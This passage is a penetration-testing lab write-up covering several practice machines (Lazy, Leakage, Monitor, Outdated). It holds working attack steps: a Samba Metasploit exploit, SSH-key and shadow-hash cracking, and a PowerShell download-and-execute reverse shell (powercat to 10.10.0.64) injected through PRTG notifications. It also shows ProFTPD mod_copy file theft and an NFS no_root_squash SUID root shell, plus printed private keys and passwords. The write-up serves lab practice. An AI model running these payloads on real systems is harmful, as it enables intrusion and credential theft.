| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
```

By searching for the version of SMB in searchsploit, we can see it is vulnerable to a "is_known_pipename()" exploit:
```
searchsploit samba 3.6.25

---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipen | linux/remote/42084.rb
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### SMB
In smbmap, we are able to confirm that we have write access to somewhere on the smb server, and as such the exploit should work.
```
smbmap -H 172.31.1.1
                                                                                                    
[+] IP: 172.31.1.1:445	Name: 172.31.1.1          	Status: Guest session   	
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	Public                                            	READ, WRITE	
	IPC$                                              	NO ACCESS	IPC Service (lazy server (Samba, Ubuntu))
```
Using the metasploit module `linux/samba/is_known_pipename` we can spawn a reverse shell. This didn't work for me with the preset target, and because of this, I had to first set the target
```
msf5 exploit(linux/samba/is_known_pipename) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic (Interact)
   1   Automatic (Command)
   2   Linux x86
   3   Linux x86_64
   4   Linux ARM (LE)
   5   Linux ARM64
   6   Linux MIPS
   7   Linux MIPSLE
   8   Linux MIPS64
   9   Linux MIPS64LE
   10  Linux PPC
   11  Linux PPC64
   12  Linux PPC64 (LE)
   13  Linux SPARC
   14  Linux SPARC64
   15  Linux s390x


msf5 exploit(linux/samba/is_known_pipename) > set target 2
target => 2
msf5 exploit(linux/samba/is_known_pipename) > run
```
Now after running we will have a shell as root:
```
whoami && hostname
root
lazy
```

## LEAKAGE

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 19:52 BST
Nmap scan report for 172.31.1.6
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7a:5a:dd:ad:4c:6f:6c:4a:60:06:4f:46:53:77:96:15 (RSA)
|   256 83:ff:c2:72:62:11:4a:86:f9:bf:41:2c:b6:2b:97:a4 (ECDSA)
|_  256 bf:93:3b:d1:6b:ea:32:99:6c:46:75:7b:e2:f1:8a:d9 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 57 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://172.31.1.6/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
```

### GITLAB
Through the gitlab api, we are able to enumerate users on the website:
```
http://172.31.1.6/api/v4/users/1

web_url	"http://172.31.1.6/root"

http://172.31.1.6/api/v4/users/2

web_url	"http://172.31.1.6/jonathan"
```
By heading to `http://172.31.1.6/jonathan` we can see some public repositories.

By searching the commits on the CMS repository, we find a leaked credential for the user `http://172.31.1.6/jonathan/CMS/-/commit/779d0aede34847d51e14991d88e3aaf3b39ada87`
```
define('URL_USER',PROTOCOL.'doorgets.prod:8888/dg-user/');
define('SQL_HOST','localhost');
define('SQL_LOGIN','jonathan');
define('SQL_PWD','rPHAKWAgMZtjr9at');
define('SQL_PWD','');
define('SQL_DB','doorgets-prod01');
define('SQL_VERSION','5.5.42');
require_once CONFIGURATION.'includes.php';
```
After loggin into gitlab as this user, there is one more private repository named security. Inside here is a ssh key we can grab:
```
http://172.31.1.6/jonathan/security/-/blob/master/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,8195A08A6A205E425326C0C3FDC09F06

Xv4NSHR4axwHPGs0La0NztG45JBvlIgDFtPs0okJw/AyskKSNrAmIkzdp3WXuETG
tal1ODeucnIlipYnXPSOuzJAchk3lkyUqpMSB+N8ljCvLnTEY0FZU0HsHkaPWvPB
qTn4tgtrgzO2hI2S/WV5q43vmmTbC7pZraMdGakr/uncbav59CnQl4mr7uygYYuq
CoN26OFPefFA5KIvUWURZfMgaMjFqP0udrj2IXh0LJxpKlrFGItST2KscFcustvS
VU9JQsWoJ9O4JUcb9dUaxU1LYmfFv2PcogN0joipCbPppNL1iBkwusRoCVCFGIM9
7mAccCZBc53t6mV8OCpBXxDmm5V4HrQGnMeZBoguuPPYR54KTbF9qhU4ZOTODVzp
ADP32fau3m13UqzZsBShOsrR6wC6UgtvZ1nuELMjl0GcCZ2UAScD97hy+7vV4O22
umIRm9wQjSWBtY6cZe47usTuzyXPzpaqtZl3Em+2BzUE+JEvETmZ0+EYgGrZ6/qK
dmjt4a4gCIh4VvLxHUnyuL47V2zuKFGT7mmowUXM+g266Q0xjatdHxTbMPCr3T8f
GCW5GxYcB7yjB+jWqr+jtE45F4LG0BY0UMQzZgJ0zT+ZgbafJMd/P8qd6A1hCIqH
cNLBt3aenK8E5/ZFVbTJzFSa7NdEsZNuCAFkLN2Dh8ZZ6811orIMrKDAkVmbf3Fj
I4n/YxWtz3IrmhR/0B5D1+JZW2CkRfzJe/htLAYkOY/G8RdysAyGjLrBegyxDSHD
k1Zr25nc0URcZtDlAvVHd2i/IWfIpsIF+ZcY4+QGx5yH0NNP42K+UMJFSnWdL0CN
K1KiROGNBdNYsP5A0e/Odasz7pnev8w2KdW0pOEAd8ORBLtWcwoYectFdaR8nRhM
8UiOhfk9Y0FsrPb7t9KcjkzWEgZjNbMZrQTyoEaqLGXTO0ESS/gkicz9rFUU7qmQ
u+HWltL3+5C5VO7tvq21MPt7KZ2r0AbxRxRU+Xk55++vJSkNMtONpSaeXe2/+5Fj
w6BOT5KO2eiUwo2C7GBl+aJl8K7a2gtZaOw5KJYGUfs+qcoLo1V2k0qicLvldJnP
11nnwU3mCNtq2SHvwriDIkx0jT7s1s+rlT8E9ySJhyG+9KUdaDnbC5gz9j5pm/QA
CiBQV+czK3/LBt3+dEjyJXP+RjcdDi60Owiu6egrfF5Pms9XY7Z8PG+oHlpH+B6k
IhYbEL/qPcLkHjuwHTFLUICsX/HuBGMBCY6karuf+6AwpaohMT9Wn+Es7UZ3FBSz
BDwZAE68fyOLmJgFY7SlIXQhQcP7dVTc5EaIBCWKIoeLJNEqwKgkLxMxybnz21vk
UdZ6ZOVg49VNb15omZtiEXA2L46BhtxHJEiJR9lKfYw+20++XjwKyy7RPo/vE5Yn
FJgDajrLEvtNxEZ0B/tNdxI61lkOK8+GXRCQU+9WFtsl+I46Ut24L3XUDQQmPyWk
boDDkgA0WnM08LDbA3FK5GBPB6go2HTZ/bidzABx9KpkaJfHzZgQzEMSfTz2Melq
jj5rxHXKJDLV/cLhGAXmTqfhknTbHvBzzfs0GMkZICXlDSjvuDriJd+1DswKckaV
-----END RSA PRIVATE KEY-----
```

After trying to log in with this, we see it has a password. So we use ss2john to create a hash and crack it to find the password 
```
/opt/JohnTheRipper/run/ssh2john.py id_rsa > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
scooby           (id_rsa)
```
Now we can log in as jonathan and move onto root.


### PRIV ESC
After running linpeas.sh on the box, it shows a SUID binary `nano`. With this we can read any file on the system. Using this I read the /etc/shadow file and grabbed the hashes.
```
root:$6$yMsg6cpK$q52od6Zj/FhqmmsuVZ7pKvGJ2o2R/kieZ3SQ/QWWbdn2eVFCTewYvjKBd2P4jfsh9IYwelJoPevGpQCsA2NT61:18360:0:99999:7:::
jonathan:$6$yIbWCeV8$tN8fPhAX0UP/tfg46BozCOhAEXTBHDls.4m1jLP0Xwy8YGlmb6MymmHkw7dMyw3oAVokC5MfdEiXzgY60eUw0/:18365:0:99999:7:::
```
Now we can crack with john:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (root)
```
Now we have the password we can `su root` to spawn a shell as root.


## MONITOR

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 20:29 BST
Nmap scan report for 172.31.1.21
Host is up (0.054s latency).
Not shown: 994 closed ports
PORT     STATE    SERVICE       VERSION
80/tcp   open     http          Indy httpd 18.1.38.11958 (Paessler PRTG bandwidth monitor)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds
808/tcp  filtered ccproxy-http
3389/tcp open     ms-wbt-server Microsoft Terminal Services

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.97 seconds
```

### SMB
First thing to check is for null/guest session on smb, and here we see a "WebBackups" share.
```
smbclient -L 172.31.1.21
Enter WORKGROUP\corn's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WebBackups      Disk      
SMB1 disabled -- no workgroup available
```
Inside here is a zip, so let's grab it and unzip it.
```
smbclient -H \\\\172.31.1.21\\WebBackups
Enter WORKGROUP\corn's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 02:19:49 2020
  ..                                  D        0  Thu Jul  9 02:19:49 2020
  dev06.zip                           A    16919  Thu Jul  9 02:19:50 2020

		7863807 blocks of size 4096. 3610817 blocks available
smb: \> get dev06.zip 
getting file \dev06.zip of size 16919 as dev06.zip (43.5 KiloBytes/sec) (average 43.5 KiloBytes/sec)
```

### BACKUPS
Inside the zip file was a backup of a web application. Inside the directory there is a sqlite3 file which we can take a look in for passwords using `sqlitebrowser`
```
sqlitebrowser dev06/db.sqlite3

ID   USER     PASSWORD
1	django	Se7vmMqP0al
```
With this password we can loginto the PRTGADMIN with the credentials `prtgadmin:Se7vmMqP0al`
### PRTGADMIN

I spent a whole lot of time on this, trying different exploits and payload. Literally must have been about 2 hours on this in total.

But alas, the working process was as follows:
```
head to /myaccount.htm?tabid=2

click on the "Ticket Notification" to edit the notification

Scroll down to the "Execute Program" part and set the "Program File" to "Demo exe notification - outfile.ps1"

Add the paramter "powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.0.64/powercat.ps1');powercat -c 10.10.0.64 -p 4444 -e cmd"

Click save
```
Now with both our listeners running we can execute the payload by doing this:
```
head to /myaccount.htm?tabid=2 if not already there

click on the clipboard on the far right of the "Ticket Notification" cell

Click on the "Send test notification" button

And now it will execute the payload and give us a shell.
```
## OUTDATED

### NMAP
```

```

### MOUNT
```

```
### FTP

Using the mod_copy exploit we are able to copy any file we like around the filesystem. To do this use the following commands:
```
nc 172.31.1.22

site cpfr "FILE YOU WANT"
site cpto "PLACE YOU WANT IT TO BE"
```

Using this we can copy the files to our mounted folder.

First we get the /etc/passwd file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
daniel:x:1000:1000:daniel,,,:/home/daniel:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
```
Next we get the ssh key from `/home/daniel/.ssh/id_rsa`
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAtAYtMXjH4cxImGgb0VOMEN5elt91xMdTp/x2mBWEZpcyMOGE
YeGn9PZ2i9m1/xz2IgdW+WS8iDZNPBfErVpoPBhLcOsXxhN1Hqq+1BR9YuJWpOPV
LKgx9SAV96scS4Ds58kb1TvfHuUVXw01DlzCN1Pc4tkRuaKhWnpSsiB+lBx4y0Dq
AFYOykwO67+9hY8epEsRawR9G8EKkOSj1I/lkBT40kSy5+Ovxhut35e/FYqPBXZe
wri4hjU2u9EqDqNSv8hR+YKqLi5CXsxOosUIRdULqubqAQKcIXuwxBdQg1ecPCuG
CFqk4qWpiFjQ38etHwGpC3VqLBBW1HzbD+JIowIDAQABAoIBAGLvdgzXNPp523eu
14Ld6H8oxlEiM8XWSbpre/2u7Zm4BERq2+czLavpe1L2bhfrIbWn1PuwihBNz3p0
EYm3wsssCuHewa0A6n/VFJTXQeWDQFzUPUaSlQoC/S+koSM5knj7xEkW41NGUM1x
I7Rl8/KWKzGcXCpqH0TrLuFoDEh2xRaAYtHY+FPXItbaFE+VUhRw/hD95+IIdDQT
rhN4d1kPDytgXyNJCVDJNIAo+KZrVbdqigN5Sb9SbpP29OAaLUCnBLODksIrCCqK
LkZrata8ZoBypurtI3fc86dN0DPomXCr/udIsKwuoL42uzy07xEUypS7xUbQIDjC
0kpBbLkCgYEA4GC0CzuCXQkSjTwO8+q/fzcEp7cflRB8ftEMQ/bG4LEGZHMkQU08
UTJPTfbMo5LzW6bFf8aJB3jWTBWMxqSD8GHhUJsw7RMzisyvOYRSiPAJZ1RhzSNI
ovjCWEhjlSoPA0NRPQsEnJPQ2vj2QWE08nD+rI/GyXv4EuY5MKwN+9UCgYEAzWU+
mOmExpT0SVQ4sZjduhjKsRQyhFKZSjvDPCRGraX4wAKWR5JATX+oitvh4c58wkQV
sta4G/LScIy2AcZfr4Ir2wv3hm8zXQ55u7+1zlY0vhycrCA7usncZbzDXYOgOgDh
n5MDmNaCUmj6enzm0Mjk6m7M5khpPmbVNfFsxpcCgYBQc/w6xtTAnT8sqytFZJfT
epvNs0i8v1OUeUqnl/XJnVAIdoy6aYJGLv7mmqbXxBpEc7D/VuXNaxOT5mo608SH
TeFncK4DY84oZ6owunSJq2ADz+rdjlg+L2ooE5S5aIJHjjyz4Z5+sjXCPmC2Iq/E
eqWmpEsH9c6GoExDWn4NHQKBgAn+lDYynsBe/SgYTg3uR1PH4w0M04x2zHi9QbnK
dhn7CoilV5Sx/CkJPjVLj8lCF/YIBBpIsnrBrRXG8xBRC9Tpe6LUCT5kaNZtXuUQ
5hLdRQG/OKxzgRSMwAm/Tq5dOk24P0JZkAI+5eaGrzGIpF6id+kkbRoDigN8U4Gl
dsqPAoGADyJJsxRBS4SoT6Q9cq7GgTY73Csz75sHHDcxrC9Eb0IaQnMbz6SlvlLE
p/iY3kZTa6NuTjx+AnAuT2Mki7EfEiJPWJ7MnEM/9L0459Eny9QKwEWFqb1lE9YX
L5NtfX59gDlgIFlLdZ1aYmjgQuaAhs2GIMzjplGHn9isvD4+AdM=
-----END RSA PRIVATE KEY-----
```
Now we can login to the machine as `daniel`.

### PRIV ESC

After running linpeas.sh I saw some interesting output for an exploit I haven't seen before
```
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/var/nfsbackups *.*.*.*(rw,sync,no_subtree_check,no_root_squash,insecure)
```
Due to the fact we have write privileges to the share and there is the "no_root_squash" option, we can place in a SUID C program and execute it as daniel to spawn a shell as root:
```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/sh");
    return 0;
}

ATTACKING MACHINE:
gcc payload.c -o payload

chmod +s payload

VICTIM MACHINE:
daniel@outdated:/var/nfsbackups$ ls -la
total 44
drwxr-xr-x  5 daniel daniel  4096 Jul 12 14:38 .
drwxr-xr-x 12 root   root    4096 Jul  2 11:40 ..
drwxr-xr-x  2 daniel daniel  4096 Jul 12 14:30 anna
drwxr-xr-x  2 daniel daniel  4096 Jun 30 07:37 daniel
-rwsr-sr-x  1 root   root   16664 Jul 12 14:38 payload
-rw-r--r--  1 root   root      78 Jul 12 14:38 payload.c
drwxr-xr-x  2 daniel daniel  4096 Jun 30 07:37 robert

daniel@outdated:/var/nfsbackups$ ./payload 
# whoami
root
```
